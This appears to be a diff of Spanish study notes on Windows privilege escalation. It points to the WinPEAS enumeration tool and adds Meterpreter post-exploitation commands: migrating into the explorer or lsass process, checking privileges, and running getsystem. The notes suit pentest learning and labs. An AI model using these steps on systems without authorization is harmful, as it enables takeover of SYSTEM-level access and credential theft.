@@ -1,11 +1,11 @@
-# Escalacion de privilegios Windows
+# Escalación de privilegios Windows
 
 Tags: #Windows #Escalada #Privilegios #NT-AuthoritySystem #WinPEAS #SystemInfo #NetUser #Whoami/Priv 
 
-## Enumeracion Tools
+## Enumeración
 
-* **Herramienta WinPEAS**: [WinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) 
-Nos dirigimos a: Download the **latest obfuscated and not obfuscated versions from here**, -> Después debemos de descargar el archivo **winPeasx64.exe**
+* [WinPEAS](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)
+Nos dirigimos a: Descargar el **latest obfuscated and not obfuscated versions from here**, -> Después descargar el archivo **winPeasx64.exe**
 
 ```bash
 En WinPeas podemos encontrar las siguientes vulnerabilidades
@@ -15,6 +15,20 @@ En WinPeas podemos encontrar las siguientes vulnerabilidades
 ```
 
 ## Manual 
+
+```bash 
+# Cuando tienes la sesion con Meterpreter 
+❯ sysinfo                  # Muestra informacion del Windows 
+❯ pgrep explorer           # Mirar el numero del proceso y asi poder escalar privilegios 
+❯ pgrep lsass              # Mirar el numero del proceso y asi poder escalar privilegios 
+❯ migrate <ID>             # Nos migramos al proceso 
+ 
+❯ getuid                   # Miramos el nombre del usuario 
+❯ getprivs                 # Miramos los privilegios 
+❯ getsystem                # Miras los procesos privilegiados 
+
+❯ getprivs                 # Miramos los  procesos con privilegios
+```
 
 ```bash 
 ❯  getuid                                    # Nombre del servidor 
